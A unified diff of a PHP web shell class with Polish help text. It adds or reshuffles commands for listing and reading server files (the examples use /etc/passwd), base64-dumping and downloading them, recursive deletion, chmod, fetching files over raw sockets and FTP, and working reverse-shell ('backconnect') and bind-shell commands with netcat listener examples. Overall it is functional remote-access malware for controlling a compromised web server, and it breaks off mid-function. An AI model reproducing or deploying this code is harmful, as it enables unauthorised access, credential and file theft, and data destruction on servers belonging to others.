@@ -174,17 +174,19 @@ CONTENT;
 		 */
 		if( ! $this -> bSafeMode )
 		{
+			//ini_set( 'display_errors', 0 );
 			ini_set( 'max_execution_time', 0 );
 			ini_set( 'memory_limit', '1024M' );
-			//ini_set( 'display_errors', 0 );
 			ini_set( 'default_socket_timeout', 5 );
+			ini_set( 'date.timezone', 'Europe/Warsaw' );
 		}
 
 		/**
 		 * Config
 		 */
-		ignore_user_abort( 0 );
 		error_reporting( -1 );
+		ignore_user_abort( 0 );
+		date_default_timezone_set( 'Europe/Warsaw' );
 
 		/**
 		 * disable_functions
@@ -196,25 +198,6 @@ CONTENT;
 
 			$this -> aDisableFunctions = $aDisableFunctions;
 		}
-	}
-
-
-	private function parseArgv( & $sVar )
-	{
-		$sVar = strtr( $sVar, array
-			(
-				'\\\'' => '\'',
-				'\\"'  => '"'
-			)
-		);
-
-		if(    ( ( substr( $sVar, 0, 1 ) === '"' ) && ( substr( $sVar, -1 ) === '"' ) )
-		    || ( ( substr( $sVar, 0, 1 ) === '\'' ) && ( substr( $sVar, -1 ) === '\'' ) )
-		)
-		{
-			$sVar = substr( $sVar, 1, -1 );
-		}
-
 	}
 
 	/**
@@ -304,7 +287,7 @@ CONTENT;
 				ini_get( 'open_basedir' ),
 				php_sapi_name(),
 				php_uname(),
-				implode( ',', $this -> aDisableFunctions )
+				( ( $sDisableFunctions = implode( ',', $this -> aDisableFunctions ) === '' ) ? 'brak' : $sDisableFunctions )
 		);
 	}
 
@@ -354,6 +337,147 @@ HELP;
 		}
 
 		return 'pong';
+	}
+
+	/**
+	 * Komenda - ls
+	 *
+	 * @access private
+	 * @return string
+	 */
+	private function getCommandLs()
+	{
+		/**
+		 * Help
+		 */
+		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
+		{
+			return <<<HELP
+ls - Wyświetlanie informacji o plikach i katalogach
+
+	Użycie:
+		ls ścieżka_do_katalogu
+
+	Opcje:
+		-l  wyświetlanie szczegółowych informacji o plikach i katalogach
+		    właściciel, grupa, rozmiar, czas utworzenia
+
+		-R wyświetlanie plików i katalogów rekurencyjnie
+
+	Przykład:
+		ls /home/
+		ls -l /home/
+		ls -lR /home/
+HELP;
+		}
+
+		$sOutput = NULL;
+
+		/**
+		 * Domyslny katalog jezeli nie podano sciezki
+		 */
+		$sDir = ( ! empty( $this -> sArgv ) ? $this -> sArgv : dirname( __FILE__ ) );
+
+		$bList      = in_array( 'l', $this -> aOptv );
+		$bRecursive = in_array( 'R', $this -> aOptv );
+
+		try
+		{
+			/**
+			 * Jezeli chcemy wyswietlic pliki i katalogi rekurencyjnie to uzywamy
+			 * obiektu RecursiveDirectoryIterator
+			 */
+			if( $bRecursive )
+			{
+				$oDirectory = new RecursiveIteratorIterator( new RecursiveDirectoryIterator( $sDir ), RecursiveIteratorIterator::SELF_FIRST );
+			}
+			else
+			{
+				$oDirectory = new DirectoryIterator( $sDir );
+			}
+
+			/**
+			 * Informacja o komendzie jaka wykonalismy
+			 */
+			$sOutput .= sprintf( "%s %s\n\n", $this -> sCmd, $this -> sArgv );
+
+			$sFileName = ( $bRecursive ? 'getPathname' : 'getBasename' );
+
+			foreach( $oDirectory as $oFile )
+			{
+				if( $bList )
+				{
+					/**
+					 * Windows ?
+					 */
+					if( $this -> bWindows )
+					{
+						$sOutput .= sprintf( "%s %11d %s %s\n",
+							( ( $oFile -> getType() === 'file' ) ? '-' : 'd' ),
+							$oFile -> getSize(), date( 'Y-m-d h:i',
+								$oFile -> getCTime() ),
+							$oFile -> {$sFileName}()
+						);
+					}
+					else
+					{
+						$sOutput .= sprintf( "%s%s %-10s %-10s %11d %s %s\n",
+							( ( $oFile -> getType() === 'file' ) ? '-' : 'd' ),
+							substr( sprintf( '%o', $oFile -> getPerms() ), -4 ),
+							$this -> getOwnerById( $oFile -> getOwner() ),
+							$this -> getGroupById( $oFile -> getGroup() ),
+							$oFile -> getSize(), date( 'Y-m-d h:i',
+							$oFile -> getCTime() ), $oFile -> {$sFileName}()
+						);
+					}
+				}
+				else
+				{
+					$sOutput .= sprintf( "%s %s\n", ( ( $oFile -> getType() === 'file' ) ? 'fil' : 'dir' ), $oFile -> {$sFileName}() );
+				}
+			}
+
+			return htmlspecialchars( $sOutput );
+		}
+		catch( Exception $oException )
+		{
+			return sprintf( "Nie można otworzyć katalogu \"%s\"\n\nErro: %s", $sDir, $oException -> getMessage()  );
+		}
+	}
+
+	/**
+	 * Komenda - cat
+	 *
+	 * @access private
+	 * @return string
+	 */
+	private function getCommandCat()
+	{
+		/**
+		 * Help
+		 */
+		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
+		{
+			return <<<HELP
+cat - Wyświetlanie zawartości pliku
+
+	Użycie:
+		cat ścieżka_do_pliku
+
+	Przykład:
+		cat /etc/passwd
+HELP;
+		}
+
+		/**
+		 * Plik zrodlowy musi istniec
+		 */
+		if( ! is_file( $this -> sArgv ) )
+		{
+			return sprintf( 'Plik "%s" nie istnieje', $this -> sArgv );
+		}
+
+		return htmlspecialchars( file_get_contents( $this -> sArgv ) );
 	}
 
 	/**
@@ -457,13 +581,12 @@ HELP;
 	}
 
 	/**
-	 * Komenda - game
+	 * Komenda - remove
 	 *
-	 * @ignore
 	 * @access private
 	 * @return string
 	 */
-	private function getCommandG4m3()
+	private function getCommandRemove()
 	{
 		/**
 		 * Help
@@ -471,64 +594,167 @@ HELP;
 		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
 			return <<<HELP
-g4m3 - Gra z komputerem, wspaniała na samotne wieczory ;)
-
-	Sprawdziłeś już komende <strong>:cr3d1ts</strong> ?
+remove, rm, delete, del - Usuwanie pliku / katalogu. Zawartość katalogu zostanie usunięta rekurencyjnie
 
 	Użycie:
-		g4m3 cyfra_z_przedziału_0-9
+		remove ścieżka_do_katalogu_lub_pliku
+HELP;
+		}
 
-		g4m3 cyfra_z_przedziału_0-9 [ilość_losowań]
+		$sOutput = NULL;
+
+		/**
+		 * Jezeli podana sciezka to plik
+		 */
+		if( is_file( $this -> sArgv ) )
+		{
+			if( ! unlink( $this -> sArgv ) )
+			{
+				return sprintf( 'Plik "%s" <span class="red">nie został usunięty</span>', $this -> sArgv );
+			}
+
+			return sprintf( 'Plik "%s" <span class="green">został usunięty</span>', $this -> sArgv );
+		}
+		/**
+		 * Jezeli podana sciezka to katalog
+		 */
+		if( is_dir( $this -> sArgv ) )
+		{
+			try
+			{
+				$oDirectory = new RecursiveIteratorIterator( new RecursiveDirectoryIterator( $this -> sArgv, RecursiveDirectoryIterator::SKIP_DOTS ), RecursiveIteratorIterator::CHILD_FIRST );
+
+				foreach( $oDirectory as $oFile )
+				{
+					if( $oFile -> isDir() )
+					{
+						/**
+						 * Usuwanie katalogu
+						 */
+						if( ! rmdir( $oFile -> getPathname() ) )
+						{
+							$sOutput .= sprintf( "Katalog \"%s\" <span class=\"red\">nie został usunięty</span>\n", $oFile -> getPathname() );
+						}
+					}
+					else
+					{
+						/**
+						 * Usuwanie pliku
+						 */
+						if( ! unlink( $oFile -> getPathname() ) )
+						{
+							$sOutput .= sprintf( "Plik    \"%s\" <span class=\"red\">nie został usunięty</span>\n", $oFile -> getPathname() );
+						}
+					}
+				}
+
+				/**
+				 * Usuwanie ostatniego katalogu
+				 */
+				if( ! rmdir( $this -> sArgv ) )
+				{
+					return $sOutput . sprintf( 'Katalog "%s" <span class="red">nie został usunięty</span>', $this -> sArgv );
+				}
+			}
+			catch( Exception $oException )
+			{
+				return sprintf( "Nie można otworzyć katalogu \"%s\"\n\nErro: %s", $sDir, $oException -> getMessage()  );
+			}
+
+			return sprintf( 'Katalog "%s" <span class="green">został usunięty</span>', $this -> sArgv );
+		}
+
+		return sprintf( 'Podana ścieżka "%s" nie istnieje', $this -> sArgv );
+	}
+
+	/**
+	 * Komenda - chmod
+	 *
+	 * @access private
+	 * @return string
+	 */
+	private function getCommandChmod()
+	{
+		/**
+		 * Help
+		 */
+		if( ( $this -> iArgc === 2 ) || ( $this -> aArgv[0] === 'help' ) )
+		{
+			return <<<HELP
+chmod - Zmiana uprawnień dla pliku
+
+	Użycie:
+		chmod uprawnienie plik_lub_katalog
+
+	Przykład:
+		chmod 777 /tmp/plik
 HELP;
 		}
 
 		/**
-		 * Jesli 'liczba' jest rowna 'x' to komputer sam losuje liczby
+		 * Chmod jest wymagany
 		 */
-		if( ( $this -> aArgv[0] !== 'x' ) && ( ! ctype_digit( $this -> aArgv[0] ) || strlen( $this -> aArgv[0] ) !== 1 ) )
+		if( ! ctype_digit( $this -> aArgv[0] ) || strlen( $this -> aArgv[0] ) !== 3 )
 		{
-			return 'Komputera nie oszukasz, zapoznaj się z zasadami gry';
+			return sprintf( 'Błędny chmod "%d"', $this -> aArgv[0] );
 		}
 
 		/**
-		 * Maksymalnie 1000 losowan
+		 * Plik musi istniec
 		 */
-		if( isset( $this -> aArgv[1] ) && ( ! ctype_digit( $this -> aArgv[1] ) || ( $this -> aArgv[1] > 1000 ) ) )
+		if( ! is_file( $this -> aArgv[1] ) )
 		{
-			return 'Komputera nie oszukasz, zapoznaj się z zasadami gry';
+			return sprintf( 'Plik "%s" nie istnieje', $this -> aArgv[1] );
 		}
 
-		$iLoop = ( isset( $this -> aArgv[1] ) ? (int) $this -> aArgv[1] : 10 );
-
-		$sOutput = NULL;
-
-		$iWins  = 0;
-		$iLoses = 0;
-
-		$iDigit = (int) $this -> aArgv[0];
-
-		$i = 0;
-		do
+		if( chmod( $this -> aArgv[1], $this -> aArgv[0] ) )
 		{
-			if( $this -> aArgv[0] === 'x' )
-			{
-				$iDigit = mt_rand( 0, 9 );
-			}
-
-			if( ( $iNum = mt_rand( 0, 9 ) ) === $iDigit )
-			{
-				$sOutput .= sprintf( "<span class=\"green\">Wygrałeś</span>   Twoja liczba: <strong>%d</strong>, liczba komputera: <strong>%d</strong>\n", $iDigit, $iNum );
-				++$iWins;
-			}
-			else
-			{
-				$sOutput .= sprintf( "<span class=\"red\">Przegrałeś</span> Twoja liczba: <strong>%d</strong>, liczba komputera: <strong>%d</strong>\n", $iDigit, $iNum );
-				++$iLoses;
-			}
+			return 'Uprawnienia <span class="green">zostały zmienione</span>';
 		}
-		while( ++$i < $iLoop );
 
-		return sprintf( "<span class=\"red\">Przegrałeś</span>: <strong>%d</strong>, <span class=\"green\">Wygrałeś</span>: <strong>%d</strong>, Success rata: <strong>%.2f</strong> %%\n\n%s", $iLoses, $iWins, ( $iWins / $this -> aArgv[1] ) * 100, $sOutput );
+		return 'Uprawnienia <span class="red">nie zostały zmienione</span>';
+	}
+
+	/**
+	 * Komenda - bcat
+	 *
+	 * @access private
+	 * @return string
+	 */
+	private function getCommandBCat()
+	{
+		/**
+		 * Help
+		 */
+		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
+		{
+			return <<<HELP
+bcat, b64 - Wyświetlanie zawartości pliku przy użyciu base64
+
+	Użycie:
+		bcat ścieżka_do_pliku
+
+	Przykład:
+		bcat /etc/passwd
+HELP;
+		}
+
+		/**
+		 * Plik zrodlowy musi istniec
+		 */
+		if( ! is_file( $this -> sArgv ) )
+		{
+			return sprintf( 'Plik "%s" nie istnieje', $this -> sArgv );
+		}
+
+		/**
+		 * Naglowek Mime i zrodlo pliku w base64
+		 */
+		$sMime = sprintf( "MIME-Version: 1.0\r\nContent-Type: application/octet-stream; name=\"%s\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename=\"%s\"\r\n\r\n",
+			basename( $this -> sArgv ), basename( $this -> sArgv )
+		);
+
+		return htmlspecialchars( $sMime . chunk_split( base64_encode( file_get_contents( $this -> sArgv ) ), 130 ) );
 	}
 
 	/**
@@ -562,6 +788,272 @@ HELP;
 		ob_end_flush();
 
 		return htmlspecialchars( $sData );
+	}
+
+	/**
+	 * Komenda - phpinfo
+	 *
+	 * @uses   Html
+	 *
+	 * @access private
+	 * @return string
+	 */
+	private function getCommandPhpInfo()
+	{
+		/**
+		 * Help
+		 */
+		if( ( $this -> iArgc === 1 ) && ( $this -> aArgv[0] === 'help' ) )
+		{
+			return <<<HELP
+phpinfo - Informacje o PHP
+
+	Użycie:
+		{$this -> sPhpInfo}
+HELP;
+		}
+
+		ob_start();
+		phpinfo();
+		$sData = ob_get_contents();
+		ob_clean();
+		ob_end_flush();
+
+		/**
+		 * Wywalanie zbednych tresci, klasy itp
+		 * Licencje kazdy zna
+		 */
+		$sData = str_replace( array
+			(
+				' class="e"',
+				' class="v"'
+			),
+			'',
+			substr( $sData,
+				strpos( $sData, '<div class="center">' ) + 20,
+				-( strlen( $sData ) - strrpos( $sData, '<h2>PHP License</h2>' ) )
+			)
+		);
+
+		/**
+		 * logo kazdy widzial, creditsy tez
+		 */
+		$sData = preg_replace( '~<a href="http://www.php.net/"><img border="0" src="[^"]+" alt="PHP Logo" /></a><h1 class="p">(.+?)</h1>~', '<h1>$1</h1>', $sData );
+		$sData = preg_replace( '~<a href=".+?"><img border="0" src=".+?" alt=".+?" /></a>~', NULL, $sData );
+		$sData = preg_replace( '~<hr />\s+<h1><a href=".+?">PHP Credits</a></h1>~', NULL, $sData );
+
+		return Html::shrink( $sData );
+	}
+
+	/**
+	 * Komenda - socketdownload
+	 *
+	 * @access private
+	 * @return string
+	 */
+	private function getCommandSocketDownload()
+	{
+		/**
+		 * Help
+		 */
+		if( ( $this -> iArgc !== 2 ) || ( $this -> aArgv[0] === 'help' ) )
+		{
+			return <<<HELP
+socketdownload, socketdown, socketget - Pobieranie pliku za pomocą protokołu TCP
+
+	Użycie:
+		socketupload host:port ścieżka_do_pliku_gdzie_ma_być_zapisany
+
+	Przykład:
+		socketupload localhost:6666 /tmp/plik.txt
+
+	NetCat:
+		nc -vv -w 1 -l -p 6666 < plik.txt
+HELP;
+		}
+
+		/**
+		 * Plik zrodlowy musi istniec
+		 */
+		$aHost = $this -> getHost( $this -> aArgv[0] );
+
+		if( $aHost[1] === 0 )
+		{
+			return sprintf( 'Błędny host "%s"', $this -> aArgv[0] );
+		}
+
+		/**
+		 * Polaczenie z hostem
+		 */
+		if( ! ( $rSock = fsockopen( $aHost[0], $aHost[1] ) ) )
+		{
+			return htmlspecialchars( sprintf( 'Nie można połączyć się z serwerem "%s"', $this -> aArgv[0] ) );
+		}
+
+		/**
+		 * File
+		 */
+		if( ! ( $rFile = fopen( $this -> aArgv[1], 'w' ) ) )
+		{
+			return htmlspecialchars( sprintf( 'Nie można odczytać pliku "%s"', $this -> aArgv[1] ) );
+		}
+
+		while( ! feof( $rSock ) )
+		{
+			fwrite( $rFile, fread( $rSock, 131072 ) );
+		}
+
+		fclose( $rFile );
+		fclose( $rSock );
+
+		return htmlspecialchars( sprintf( 'Plik został pobrany i zapisany w "%s"', $this -> aArgv[1] ) );
+	}
+
+	/**
+	 * Komenda - ftpdownload
+	 *
+	 * @access private
+	 * @return string
+	 */
+	private function getCommandFtpDownload()
+	{
+		/**
+		 * Help
+		 */
+		if( ( $this -> iArgc !== 4 ) || ( $this -> aArgv[0] === 'help' ) )
+		{
+			return <<<HELP
+ftpdownload, ftpdown, ftpdown - Pobieranie pliku z FTP
+
+	Użycie:
+		ftpdownload host:port login@hasło plik_źródłowy plik_docelowy_
+
+	Przykład:
+		ftpdownload localhost:6666 test@test /plik.txt /home/usr/plik.txt
+HELP;
+		}
+
+		$aHost = $this -> getHost( $this -> aArgv[0] );
+
+		if( $aHost[1] === 0 )
+		{
+			$aHost[1] = 21;
+		}
+
+		/**
+		 * login@pass
+		 */
+		list( $sUsername, $sPassword ) = explode( '@', $this -> aArgv[1] );
+
+		/**
+		 * Ustanawianie polaczenia
+		 */
+		if( ! ( $rFtp = ftp_connect( $aHost[0], $aHost[1], 5 ) ) )
+		{
+			return htmlspecialchars( sprintf( 'Nie można połączyć się z serwerem FTP "%s"', $this -> aArgv[0] ) );
+		}
+
+		/**
+		 * Autoryzacja
+		 */
+		if( ! ftp_login( $rFtp, $sUsername, $sPassword ) )
+		{
+			return htmlspecialchars( sprintf( 'Błędne dane do autoryzacji "%s"', $this -> aArgv[1] ) );
+		}
+
+		/**
+		 * Zmiana katalogu
+		 */
+		if( ! ftp_chdir( $rFtp, ( $sDir = str_replace( '\\', '/', dirname( $this -> aArgv[2] ) ) ) ) )
+		{
+			return htmlspecialchars( sprintf( 'Na FTP nie istnieje katalog "%s"', $sDir ) );
+		}
+
+		/**
+		 * Pobieranie pliku
+		 */
+		if( ! ftp_get( $rFtp, $this -> aArgv[3], basename( $this -> aArgv[2] ), FTP_BINARY ) )
+		{
+			return htmlspecialchars( sprintf( 'Nie można pobrać pliku "%s" z serwera', $this -> aArgv[2] ) );
+		}
+
+		ftp_close( $rFtp );
+
+		return htmlspecialchars( sprintf( 'Plik "%s" został pomyślnie pobrany an FTP i zapisany w "%s"', $this -> aArgv[2], $this -> aArgv[3] ) );
+	}
+
+	/**
+	 * Komenda - download
+	 *
+	 * @access private
+	 * @return string
+	 */
+	private function getCommandDownload()
+	{
+		/**
+		 * Help
+		 */
+		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
+		{
+			return <<<HELP
+download, down, get - Pobieranie pliku
+
+	Użycie:
+		download ścieżka_do_pliku
+
+	Opcje:
+		-g pobieranie przy użyciu kompresji GZIP
+
+	Przykład:
+		download /etc/passwd
+		download -g /etc/passwd
+HELP;
+		}
+
+		$bGzip = in_array( 'g', in_array( 'R', $this -> aOptv ) );
+
+		/**
+		 * Plik zrodlowy musi istniec
+		 */
+		if( ! is_file( $this -> sArgv ) )
+		{
+			return sprintf( 'Plik "%s" nie istnieje', $this -> sArgv );
+		}
+
+		/**
+		 * Kompresja zawartosci strony
+		 */
+		if( $bGzip )
+		{
+			ini_set( 'zlib.output_compression', 9 );
+		}
+
+		ob_start();
+
+		/**
+		 * Naglowki
+		 */
+		header( 'Cache-Control: must-revalidate, post-check=0, pre-check=0', TRUE );
+		header( sprintf( 'Content-Disposition: attachment; filename="%s"', basename( $this -> sArgv ) ), TRUE );
+		header( 'Content-Type: application/octet-stream', TRUE );
+
+		if( ( $rFile = fopen( $this -> sArgv, 'r' ) ) !== FALSE )
+		{
+			if( ! $bGzip )
+			{
+				header( sprintf( 'Content-Length: %s', filesize( $this -> sArgv ) ), TRUE );
+			}
+
+			while( ! feof( $rFile ) )
+			{
+				echo fread( $rFile, 131072 );
+				ob_flush();
+				flush();
+			}
+		}
+
+		ob_end_flush();
+		exit ;
 	}
 
 	/**
@@ -634,264 +1126,6 @@ HELP;
 		fclose( $rSock );
 
 		return 'Plik został przesłany';
-	}
-
-	/**
-	 * Komenda - backconnect
-	 *
-	 * @access private
-	 * @return string
-	 */
-	private function getCommandBackConnect()
-	{
-		/**
-		 * Help
-		 */
-		if( ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
-		{
-			return <<<HELP
-backconnect, bc - Połączenie zwrotne
-
-	Klient (shell) łączy się pod wskazany adres dając dostęp do powłoki
-
-	Użycie:
-		backconnect host:port
-
-		komenda ":exit" zamyka połączenie
-
-		najlepiej uruchomić w nowym oknie
-
-	Przykład:
-		backconnect localhost:6666
-
-	NetCat:
-		nc -vv -l -p 6666
-HELP;
-		}
-
-		$aHost = $this -> getHost( $this -> aArgv[0] );
-
-		/**
-		 * Port jest wymagany
-		 */
-		if( $aHost[1] === 0 )
-		{
-			return sprintf( 'Błędny host "%s"', $this -> aArgv[0] );
-		}
-
-		/**
-		 * Polaczenie z hostem
-		 */
-		if( ! ( $rSock = fsockopen( $aHost[0], $aHost[1] ) ) )
-		{
-			return sprintf( 'Nie można połączyć się z serwerem "%s"', $this -> aArgv[0] );
-		}
-
-		fwrite( $rSock, $sTitle = sprintf( "Shell @ %s (%s)\r\n%s\r\nroot#", Request::getServer( 'HTTP_HOST' ), Request::getServer( 'SERVER_ADDR' ), php_uname() ) );
-
-		/**
-		 * BC
-		 */
-		for(;;)
-		{
-			if( ( $sCmd = fread( $rSock, 1024 ) ) !== FALSE )
-			{
-				$sCmd = rtrim( $sCmd );
-				if( $sCmd === ':exit' )
-				{
-					fwrite( $rSock, "\r\nbye ;)" );
-					fclose( $rSock );
-
-					echo 'Zakończono backconnect';
-					exit ;
-				}
-
-				fwrite( $rSock, strtr( $this -> getActionBrowser( $sCmd ), array( "\r\n" => "\r\n", "\r" => "\r\n", "\n" => "\r\n") ) );
-				fwrite( $rSock, "\r\nroot#" );
-			}
-		}
-	}
-
-	/**
-	 * Komenda - bind
-	 *
-	 * @access private
-	 * @return string
-	 */
-	private function getCommandBind()
-	{
-		/**
-		 * Help
-		 */
-		if( ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
-		{
-			return <<<HELP
-bind - Dostęp do powłoki na danym porcie
-
-	Użycie:
-		bind port
-
-		komenda ":exit" zamyka połączenie
-
-		najlepiej uruchomić w nowym oknie
-
-	Przykład:
-		bind 6666
-
-	NetCat:
-		nc host 6666
-HELP;
-		}
-
-		/**
-		 * Rozszerzenie "sockets" jes wymagane
-		 */
-		if( ! function_exists( 'socket_create' ) )
-		{
-			return 'Brak rozszerzenia "sockets"';
-		}
-
-		/**
-		 * Sprawdzanie poprawnosci portu
-		 */
-		if( ( $this -> aArgv[0] < 0 ) || ( $this -> aArgv[0] > 65535 ) )
-		{
-			return sprintf( 'Błędny port "%d"', $this -> aArgv[0] );
-		}
-
-		/**
-		 * Tworzenie socketa
-		 */
-		if( ! ( $rSock = socket_create( AF_INET, SOCK_STREAM, getProtoByName( 'tcp ' ) ) ) )
-		{
-			return 'Nie można utworzyć połączenia';
-		}
-
-		/**
-		 * Bindowanie
-		 */
-		if( ! ( socket_bind( $rSock, '0.0.0.0', $this -> aArgv[0] ) ) )
-		{
-			return sprintf( 'Nie można zbindować "0.0.0.0:%d"', $this -> aArgv[0] );
-		}
-
-		if( ! ( socket_listen( $rSock ) ) )
-		{
-			return sprintf( 'Nie można nasłuchiwać "0.0.0.0:%d"', $this -> aArgv[0] );
-		}
-
-		$bConnected = FALSE;
-
-		/**
-		 * bind
-		 */
-		for(;;)
-		{
-			/**
-			 * Klient
-			 */
-			if( ! ( $rClient = socket_accept( $rSock ) ) )
-			{
-				usleep( 10000 );
-			}
-			else
-			{
-				/**
-				 * Naglowek
-				 */
-				if( ! $bConnected )
-				{
-					socket_write( $rClient, sprintf( "Shell @ %s (%s)\r\n%s\r\nroot#", Request::getServer( 'HTTP_HOST' ), Request::getServer( 'SERVER_ADDR' ), php_uname() ) );
-					$bConnected = TRUE;
-				}
-
-				/**
-				 * Komenda
-				 */
-				for(;;)
-				{
-					if( ( $sCmd = rtrim( socket_read( $rClient, 1024, PHP_NORMAL_READ ) ) ) )
-					{
-						if( $sCmd === ':exit' )
-						{
-							socket_write( $rClient, "\r\nDobranoc ;)" );
-							socket_close( $rSock );
-							socket_close( $rClient );
-
-							echo 'Zakończono bindowanie';
-							exit ;
-						}
-
-						socket_write( $rClient, strtr( $this -> getActionBrowser( $sCmd ), array( "\r\n" => "\r\n", "\r" => "\r\n", "\n" => "\r\n") ) );
-						socket_write( $rClient, "\r\nroot#" );
-					}
-				}
-			}
-		}
-	}
-
-	/**
-	 * Komenda - socketdownload
-	 *
-	 * @access private
-	 * @return string
-	 */
-	private function getCommandSocketDownload()
-	{
-		/**
-		 * Help
-		 */
-		if( ( $this -> iArgc !== 2 ) || ( $this -> aArgv[0] === 'help' ) )
-		{
-			return <<<HELP
-socketdownload, socketdown, socketget - Pobieranie pliku za pomocą protokołu TCP
-
-	Użycie:
-		socketupload host:port ścieżka_do_pliku_gdzie_ma_być_zapisany
-
-	Przykład:
-		socketupload localhost:6666 /tmp/plik.txt
-
-	NetCat:
-		nc -vv -w 1 -l -p 6666 < plik.txt
-HELP;
-		}
-
-		/**
-		 * Plik zrodlowy musi istniec
-		 */
-		$aHost = $this -> getHost( $this -> aArgv[0] );
-
-		if( $aHost[1] === 0 )
-		{
-			return sprintf( 'Błędny host "%s"', $this -> aArgv[0] );
-		}
-
-		/**
-		 * Polaczenie z hostem
-		 */
-		if( ! ( $rSock = fsockopen( $aHost[0], $aHost[1] ) ) )
-		{
-			return htmlspecialchars( sprintf( 'Nie można połączyć się z serwerem "%s"', $this -> aArgv[0] ) );
-		}
-
-		/**
-		 * File
-		 */
-		if( ! ( $rFile = fopen( $this -> aArgv[1], 'w' ) ) )
-		{
-			return htmlspecialchars( sprintf( 'Nie można odczytać pliku "%s"', $this -> aArgv[1] ) );
-		}
-
-		while( ! feof( $rSock ) )
-		{
-			fwrite( $rFile, fread( $rSock, 131072 ) );
-		}
-
-		fclose( $rFile );
-		fclose( $rSock );
-
-		return htmlspecialchars( sprintf( 'Plik został pobrany i zapisany w "%s"', $this -> aArgv[1] ) );
 	}
 
 	/**
@@ -1181,477 +1415,198 @@ HELP;
 		}
 	}
 
-
 	/**
-	 * Komenda - ftpdownload
+	 * Komenda - backconnect
 	 *
 	 * @access private
 	 * @return string
 	 */
-	private function getCommandFtpDownload()
+	private function getCommandBackConnect()
 	{
 		/**
 		 * Help
 		 */
-		if( ( $this -> iArgc !== 4 ) || ( $this -> aArgv[0] === 'help' ) )
+		if( ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
 			return <<<HELP
-ftpdownload, ftpdown, ftpdown - Pobieranie pliku z FTP
+backconnect, bc - Połączenie zwrotne
+
+	Klient (shell) łączy się pod wskazany adres dając dostęp do powłoki
 
 	Użycie:
-		ftpdownload host:port login@hasło plik_źródłowy plik_docelowy_
+		backconnect host:port
+
+		komenda ":exit" zamyka połączenie
+
+		najlepiej uruchomić w nowym oknie
 
 	Przykład:
-		ftpdownload localhost:6666 test@test /plik.txt /home/usr/plik.txt
+		backconnect localhost:6666
+
+	NetCat:
+		nc -vv -l -p 6666
 HELP;
 		}
 
 		$aHost = $this -> getHost( $this -> aArgv[0] );
 
+		/**
+		 * Port jest wymagany
+		 */
 		if( $aHost[1] === 0 )
 		{
-			$aHost[1] = 21;
+			return sprintf( 'Błędny host "%s"', $this -> aArgv[0] );
 		}
 
 		/**
-		 * login@pass
+		 * Polaczenie z hostem
 		 */
-		list( $sUsername, $sPassword ) = explode( '@', $this -> aArgv[1] );
-
-		/**
-		 * Ustanawianie polaczenia
-		 */
-		if( ! ( $rFtp = ftp_connect( $aHost[0], $aHost[1], 5 ) ) )
+		if( ! ( $rSock = fsockopen( $aHost[0], $aHost[1] ) ) )
 		{
-			return htmlspecialchars( sprintf( 'Nie można połączyć się z serwerem FTP "%s"', $this -> aArgv[0] ) );
+			return sprintf( 'Nie można połączyć się z serwerem "%s"', $this -> aArgv[0] );
 		}
+
+		fwrite( $rSock, $sTitle = sprintf( "Shell @ %s (%s)\r\n%s\r\nroot#", Request::getServer( 'HTTP_HOST' ), Request::getServer( 'SERVER_ADDR' ), php_uname() ) );
 
 		/**
-		 * Autoryzacja
+		 * BC
 		 */
-		if( ! ftp_login( $rFtp, $sUsername, $sPassword ) )
+		for(;;)
 		{
-			return htmlspecialchars( sprintf( 'Błędne dane do autoryzacji "%s"', $this -> aArgv[1] ) );
+			if( ( $sCmd = fread( $rSock, 1024 ) ) !== FALSE )
+			{
+				$sCmd = rtrim( $sCmd );
+				if( $sCmd === ':exit' )
+				{
+					fwrite( $rSock, "\r\nbye ;)" );
+					fclose( $rSock );
+
+					echo 'Zakończono backconnect';
+					exit ;
+				}
+
+				fwrite( $rSock, strtr( $this -> getActionBrowser( $sCmd ), array( "\r\n" => "\r\n", "\r" => "\r\n", "\n" => "\r\n") ) );
+				fwrite( $rSock, "\r\nroot#" );
+			}
 		}
-
-		/**
-		 * Zmiana katalogu
-		 */
-		if( ! ftp_chdir( $rFtp, ( $sDir = str_replace( '\\', '/', dirname( $this -> aArgv[2] ) ) ) ) )
-		{
-			return htmlspecialchars( sprintf( 'Na FTP nie istnieje katalog "%s"', $sDir ) );
-		}
-
-		/**
-		 * Pobieranie pliku
-		 */
-		if( ! ftp_get( $rFtp, $this -> aArgv[3], basename( $this -> aArgv[2] ), FTP_BINARY ) )
-		{
-			return htmlspecialchars( sprintf( 'Nie można pobrać pliku "%s" z serwera', $this -> aArgv[2] ) );
-		}
-
-		ftp_close( $rFtp );
-
-		return htmlspecialchars( sprintf( 'Plik "%s" został pomyślnie pobrany an FTP i zapisany w "%s"', $this -> aArgv[2], $this -> aArgv[3] ) );
 	}
 
 	/**
-	 * Komenda - ls
+	 * Komenda - bind
 	 *
 	 * @access private
 	 * @return string
 	 */
-	private function getCommandLs()
+	private function getCommandBind()
 	{
 		/**
 		 * Help
 		 */
-		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
+		if( ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
 			return <<<HELP
-ls - Wyświetlanie informacji o plikach i katalogach
+bind - Dostęp do powłoki na danym porcie
 
 	Użycie:
-		ls ścieżka_do_katalogu
+		bind port
 
-	Opcje:
-		-l  wyświetlanie szczegółowych informacji o plikach i katalogach
-		    właściciel, grupa, rozmiar, czas utworzenia
+		komenda ":exit" zamyka połączenie
 
-		-R wyświetlanie plików i katalogów rekurencyjnie
+		najlepiej uruchomić w nowym oknie
 
 	Przykład:
-		ls /home/
-		ls -l /home/
-		ls -lR /home/
+		bind 6666
+
+	NetCat:
+		nc host 6666
 HELP;
 		}
 
-		$sOutput = NULL;
+		/**
+		 * Rozszerzenie "sockets" jes wymagane
+		 */
+		if( ! function_exists( 'socket_create' ) )
+		{
+			return 'Brak rozszerzenia "sockets"';
+		}
 
 		/**
-		 * Domyslny katalog jezeli nie podano sciezki
